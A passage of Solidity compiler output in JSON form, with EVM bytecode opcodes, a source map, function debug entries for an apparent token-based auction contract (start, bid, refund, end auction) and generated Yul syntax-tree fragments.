MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD PUSH2 0xD64 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xDAB JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xD90 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDD3 DUP3 PUSH2 0xD71 JUMP JUMPDEST PUSH2 0xDDD DUP2 DUP6 PUSH2 0xD7C JUMP JUMPDEST SWAP4 POP PUSH2 0xDED DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xD8D JUMP JUMPDEST PUSH2 0xDF6 DUP2 PUSH2 0xDB7 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xE1B DUP2 DUP5 PUSH2 0xDC8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE53 DUP3 PUSH2 0xE28 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE63 DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP2 EQ PUSH2 0xE6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xE80 DUP2 PUSH2 0xE5A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE99 DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP2 EQ PUSH2 0xEA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xEB6 DUP2 PUSH2 0xE90 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xED3 JUMPI PUSH2 0xED2 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xEE1 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0xEF2 DUP6 DUP3 DUP7 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF11 DUP2 PUSH2 0xEFC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF2C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF08 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xF3B DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF56 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xF75 JUMPI PUSH2 0xF74 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF83 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0xF94 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0xFA5 DUP7 DUP3 DUP8 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFC5 DUP2 PUSH2 0xFAF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xFE0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFBC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFFC JUMPI PUSH2 0xFFB PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x100A DUP5 DUP3 DUP6 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x101C DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1037 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1013 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1054 JUMPI PUSH2 0x1053 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1062 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1073 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x10C4 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x10D7 JUMPI PUSH2 0x10D6 PUSH2 0x107D JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1117 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x1122 DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0x1130 DUP2 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0x1147 JUMPI PUSH2 0x1146 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1163 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x1013 JUMP JUMPDEST PUSH2 0x1170 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0xF32 JUMP JUMPDEST PUSH2 0x117D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1190 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x119B DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x11B3 JUMPI PUSH2 0x11B2 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA PUSH5 0x986EFE334F CREATE2 DUP4 PUSH28 0x986DB8A789595EF8A676806085E4AC809B5C5513312F64736F6C6343 STOP ADDMOD ISZERO STOP CALLER LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDE PREVRANDAO RETURNDATASIZE 0xBD 0x1F OR LT SWAP13 0xD4 DUP12 0xCA POP GT MUL 0xB1 MSIZE 0xE7 PUSH25 0x24C1B5A3660B39A879017BA4A2B964736F6C63430008150033 ","sourceMap":"302:11511:7:-:0;;;407:1;373:35;;785:5;757:33;;;;;;;;;;;;;;;;;;;;1466:391;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1577:11;1561:13;:27;1540:116;;;;;;;;;;;;:::i;:::-;;;;;;;;;1676:10;1666:20;;;;;;;;;;1711:13;1696:28;;;;;;1756:11;1734:12;:34;;;;1791:11;1778:24;;;;;;1830:20;1813:14;;:37;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;1466:391;;302:11511;;88:117:10;197:1;194;187:12;334:77;371:7;400:5;389:16;;334:77;;;:::o;417:122::-;490:24;508:5;490:24;:::i;:::-;483:5;480:35;470:63;;529:1;526;519:12;470:63;417:122;:::o;545:143::-;602:5;633:6;627:13;618:22;;649:33;676:5;649:33;:::i;:::-;545:143;;;;:::o;694:507::-;773:6;781;830:2;818:9;809:7;805:23;801:32;798:119;;;836:79;;:::i;:::-;798:119;956:1;981:64;1037:7;1028:6;1017:9;1013:22;981:64;:::i;:::-;971:74;;927:128;1094:2;1120:64;1176:7;1167:6;1156:9;1152:22;1120:64;:::i;:::-;1110:74;;1065:129;694:507;;;;;:::o;1207:169::-;1291:11;1325:6;1320:3;1313:19;1365:4;1360:3;1356:14;1341:29;;1207:169;;;;:::o;1382:229::-;1522:34;1518:1;1510:6;1506:14;1499:58;1591:12;1586:2;1578:6;1574:15;1567:37;1382:229;:::o;1617:366::-;1759:3;1780:67;1844:2;1839:3;1780:67;:::i;:::-;1773:74;;1856:93;1945:3;1856:93;:::i;:::-;1974:2;1969:3;1965:12;1958:19;;1617:366;;;:::o;1989:419::-;2155:4;2193:2;2182:9;2178:18;2170:26;;2242:9;2236:4;2232:20;2228:1;2217:9;2213:17;2206:47;2270:131;2396:4;2270:131;:::i;:::-;2262:139;;1989:419;;;:::o;2414:180::-;2462:77;2459:1;2452:88;2559:4;2556:1;2549:15;2583:4;2580:1;2573:15;302:11511:7;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@_1936":{"entryPoint":null,"id":1936,"parameterSlots":0,"returnSlots":0},"@_1940":{"entryPoint":null,"id":1940,"parameterSlots":0,"returnSlots":0},"@addBidder_1377":{"entryPoint":2031,"id":1377,"parameterSlots":0,"returnSlots":0},"@balanceOfBidder_1932":{"entryPoint":3036,"id":1932,"parameterSlots":1,"returnSlots":1},"@biddersList_1041":{"entryPoint":3260,"id":1041,"parameterSlots":0,"returnSlots":0},"@calculate_1767":{"entryPoint":4908,"id":1767,"parameterSlots":0,"returnSlots":0},"@endAuction_1810":{"entryPoint":6732,"id":1810,"parameterSlots":0,"returnSlots":0},"@getAuctionState_1949":{"entryPoint":1208,"id":1949,"parameterSlots":0,"returnSlots":1},"@refundETH_1589":{"entryPoint":1240,"id":1589,"parameterSlots":0,"returnSlots":0},"@retrieveBidderAlgos_1901":{"entryPoint":4242,"id":1901,"parameterSlots":1,"returnSlots":1},"@retrieveBidderBidValue_1886":{"entryPoint":1865,"id":1886,"parameterSlots":1,"returnSlots":1},"@retrieveContractBalance_1871":{"entryPoint":4100,"id":1871,"parameterSlots":0,"returnSlots":1},"@retrieveContractOwner_1857":{"entryPoint":4868,"id":1857,"parameterSlots":0,"returnSlots":1},"@retrieveCurrentPrice_1839":{"entryPoint":1231,"id":1839,"parameterSlots":0,"returnSlots":1},"@retrieveRefund_1916":{"entryPoint":4408,"id":1916,"parameterSlots":1,"returnSlots":1},"@retrieveReservePrice_1831":{"entryPoint":1691,"id":1831,"parameterSlots":0,"returnSlots":1},"@retrieveTotalAlgos_1821":{"entryPoint":5709,"id":1821,"parameterSlots":0,"returnSlots":1},"@retrieveTotalBidder_1849":{"entryPoint":5853,"id":1849,"parameterSlots":0,"returnSlots":1},"@sendTokens_1512":{"entryPoint":5997,"id":1512,"parameterSlots":0,"returnSlots":0},"@startAuction_1274":{"entryPoint":3365,"id":1274,"parameterSlots":2,"returnSlots":1},"@updateCurrentPrice_1439":{"entryPoint":4574,"id":1439,"parameterSlots":0,"returnSlots":0},"abi_decode_t_bool_fromMemory":{"entryPoint":9166,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256":{"entryPoint":7351,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256_fromMemory":{"entryPoint":8471,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_bool_fromMemory":{"entryPoint":9189,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256":{"entryPoint":7374,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256_fromMemory":{"entryPoint":8494,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256t_uint256":{"entryPoint":7631,"id":null,"parameterSlots":2,"returnSlots":2},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":7476,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bool_to_t_bool_fromStack":{"entryPoint":7505,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_enum$_AuctionState_$1057_to_t_uint8_fromStack":{"entryPoint":7162,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_int256_to_t_int256_fromStack":{"entryPoint":7218,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a_to_t_string_memory_ptr_fromStack":{"entryPoint":8050,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb_to_t_string_memory_ptr_fromStack":{"entryPoint":8223,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":7745,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3_to_t_string_memory_ptr_fromStack":{"entryPoint":8337,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":7274,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed":{"entryPoint":7784,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":7702,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed":{"entryPoint":9239,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed":{"entryPoint":9095,"id":null,"parameterSlots":3,"returnSlots":1},"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":7807,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_enum$_AuctionState_$1057__to_t_uint8__fromStack_reversed":{"entryPoint":7179,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_int256__to_t_int256__fromStack_reversed":{"entryPoint":7235,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":8089,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":8262,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":8376,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":7291,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_uint256_t_address__to_t_uint256_t_address__fromStack_reversed":{"entryPoint":8544,"id":null,"parameterSlots":3,"returnSlots":1},"abi_encode_tuple_t_uint256_t_address_t_uint256__to_t_uint256_t_address_t_uint256__fromStack_reversed":{"entryPoint":8410,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_uint256_t_address_t_uint256_t_uint256__to_t_uint256_t_address_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":8589,"id":null,"parameterSlots":5,"returnSlots":1},"abi_encode_tuple_t_uint256_t_address_t_uint256_t_uint256_t_uint256_t_bool__to_t_uint256_t_address_t_uint256_t_uint256_t_uint256_t_bool__fromStack_reversed":{"entryPoint":7522,"id":null,"parameterSlots":7,"returnSlots":1},"abi_encode_tuple_t_uint256_t_uint256__to_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":8975,"id":null,"parameterSlots":3,"returnSlots":1},"abi_encode_tuple_t_uint256_t_uint256_t_uint256__to_t_uint256_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":9300,"id":null,"parameterSlots":4,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":7731,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":7992,"id":null,"parameterSlots":2,"returnSlots":1},"checked_div_t_uint256":{"entryPoint":8713,"id":null,"parameterSlots":2,"returnSlots":1},"checked_mul_t_int256":{"entryPoint":8769,"id":null,"parameterSlots":2,"returnSlots":1},"checked_mul_t_uint256":{"entryPoint":9020,"id":null,"parameterSlots":2,"returnSlots":1},"checked_sub_t_int256":{"entryPoint":8901,"id":null,"parameterSlots":2,"returnSlots":1},"checked_sub_t_uint256":{"entryPoint":8123,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":7456,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bool":{"entryPoint":7493,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_enum$_AuctionState_$1057":{"entryPoint":7121,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_int256":{"entryPoint":7208,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":7424,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":7264,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_enum$_AuctionState_$1057_to_t_uint8":{"entryPoint":7142,"id":null,"parameterSlots":1,"returnSlots":1},"increment_t_uint256":{"entryPoint":7915,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x11":{"entryPoint":7868,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x12":{"entryPoint":8666,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x21":{"entryPoint":7051,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":7320,"id":null,"parameterSlots":0,"returnSlots":0},"store_literal_in_memory_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a":{"entryPoint":8009,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb":{"entryPoint":8182,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470":{"entryPoint":7742,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3":{"entryPoint":8296,"id":null,"parameterSlots":1,"returnSlots":0},"validator_assert_t_enum$_AuctionState_$1057":{"entryPoint":7098,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bool":{"entryPoint":9140,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":7325,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:15886:10","nodeType":"YulBlock","src":"0:15886:10","statements":[{"body":{"nativeSrc":"35:152:10","nodeType":"YulBlock","src":"35:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"52:1:10","nodeType":"YulLiteral","src":"52:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"55:77:10","nodeType":"YulLiteral","src":"55:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"45:6:10","nodeType":"YulIdentifier","src":"45:6:10"},"nativeSrc":"45:88:10","nodeType":"YulFunctionCall","src":"45:88:10"},"nativeSrc":"45:88:10","nodeType":"YulExpressionStatement","src":"45:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"149:1:10","nodeType":"YulLiteral","src":"149:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"152:4:10","nodeType":"YulLiteral","src":"152:4:10","type":"","value":"0x21"}],"functionName":{"name":"mstore","nativeSrc":"142:6:10","nodeType":"YulIdentifier","src":"142:6:10"},"nativeSrc":"142:15:10","nodeType":"YulFunctionCall","src":"142:15:10"},"nativeSrc":"142:15:10","nodeType":"YulExpressionStatement","src":"142:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"173:1:10","nodeType":"YulLiteral","src":"173:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"176:4:10","nodeType":"YulLiteral","src":"176:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"166:6:10","nodeType":"YulIdentifier","src":"166:6:10"},"nativeSrc":"166:15:10","nodeType":"YulFunctionCall","src":"166:15:10"},"nativeSrc":"166:15:10","nodeType":"YulExpressionStatement","src":"166:15:10"}]},"name":"panic_error_0x21","nativeSrc":"7:180:10","nodeType":"YulFunctionDefinition","src":"7:180:10"},{"body":{"nativeSrc":"253:62:10","nodeType":"YulBlock","src":"253:62:10","statements":[{"body":{"nativeSrc":"287:22:10","nodeType":"YulBlock","src":"287:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x21","nativeSrc":"289:16:10","nodeType":"YulIdentifier","src":"289:16:10"},"nativeSrc":"289:18:10","nodeType":"YulFunctionCall","src":"289:18:10"},"nativeSrc":"289:18:10","nodeType":"YulExpressionStatement","src":"289:18:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"276:5:10","nodeType":"YulIdentifier","src":"276:5:10"},{"kind":"number","nativeSrc":"283:1:10","nodeType":"YulLiteral","src":"283:1:10","type":"","value":"2"}],"functionName":{"name":"lt","nativeSrc":"273:2:10","nodeType":"YulIdentifier","src":"273:2:10"},"nativeSrc":"273:12:10","nodeType":"YulFunctionCall","src":"273:12:10"}],"functionName":{"name":"iszero","nativeSrc":"266:6:10","nodeType":"YulIdentifier","src":"266:6:10"},"nativeSrc":"266:20:10","nodeType":"YulFunctionCall","src":"266:20:10"},"nativeSrc":"263:46:10","nodeType":"YulIf","src":"263:46:10"}]},"name":"validator_assert_t_enum$_AuctionState_$1057","nativeSrc":"193:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"246:5:10","nodeType":"YulTypedName","src":"246:5:10","type":""}],"src":"193:122:10"},{"body":{"nativeSrc":"383:83:10","nodeType":"YulBlock","src":"383:83:10","statements":[{"nativeSrc":"393:16:10","nodeType":"YulAssignment","src":"393:16:10","value":{"name":"value","nativeSrc":"404:5:10","nodeType":"YulIdentifier","src":"404:5:10"},"variableNames":[{"name":"cleaned","nativeSrc":"393:7:10","nodeType":"YulIdentifier","src":"393:7:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"454:5:10","nodeType":"YulIdentifier","src":"454:5:10"}],"functionName":{"name":"validator_assert_t_enum$_AuctionState_$1057","nativeSrc":"410:43:10","nodeType":"YulIdentifier","src":"410:43:10"},"nativeSrc":"410:50:10","nodeType":"YulFunctionCall","src":"410:50:10"},"nativeSrc":"410:50:10","nodeType":"YulExpressionStatement","src":"410:50:10"}]},"name":"cleanup_t_enum$_AuctionState_$1057","nativeSrc":"321:145:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"365:5:10","nodeType":"YulTypedName","src":"365:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"375:7:10","nodeType":"YulTypedName","src":"375:7:10","type":""}],"src":"321:145:10"},{"body":{"nativeSrc":"547:70:10","nodeType":"YulBlock","src":"547:70:10","statements":[{"nativeSrc":"557:54:10","nodeType":"YulAssignment","src":"557:54:10","value":{"arguments":[{"name":"value","nativeSrc":"605:5:10","nodeType":"YulIdentifier","src":"605:5:10"}],"functionName":{"name":"cleanup_t_enum$_AuctionState_$1057","nativeSrc":"570:34:10","nodeType":"YulIdentifier","src":"570:34:10"},"nativeSrc":"570:41:10","nodeType":"YulFunctionCall","src":"570:41:10"},"variableNames":[{"name":"converted","nativeSrc":"557:9:10","nodeType":"YulIdentifier","src":"557:9:10"}]}]},"name":"convert_t_enum$_AuctionState_$1057_to_t_uint8","nativeSrc":"472:145:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"527:5:10","nodeType":"YulTypedName","src":"527:5:10","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"537:9:10","nodeType":"YulTypedName","src":"537:9:10","type":""}],"src":"472:145:10"},{"body":{"nativeSrc":"703:81:10","nodeType":"YulBlock","src":"703:81:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"720:3:10","nodeType":"YulIdentifier","src":"720:3:10"},{"arguments":[{"name":"value","nativeSrc":"771:5:10","nodeType":"YulIdentifier","src":"771:5:10"}],"functionName":{"name":"convert_t_enum$_AuctionState_$1057_to_t_uint8","nativeSrc":"725:45:10","nodeType":"YulIdentifier","src":"725:45:10"},"nativeSrc":"725:52:10","nodeType":"YulFunctionCall","src":"725:52:10"}],"functionName":{"name":"mstore","nativeSrc":"713:6:10","nodeType":"YulIdentifier","src":"713:6:10"},"nativeSrc":"713:65:10","nodeType":"YulFunctionCall","src":"713:65:10"},"nativeSrc":"713:65:10","nodeType":"YulExpressionStatement","src":"713:65:10"}]},"name":"abi_encode_t_enum$_AuctionState_$1057_to_t_uint8_fromStack","nativeSrc":"623:161:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"691:5:10","nodeType":"YulTypedName","src":"691:5:10","type":""},{"name":"pos","nativeSrc":"698:3:10","nodeType":"YulTypedName","src":"698:3:10","type":""}],"src":"623:161:10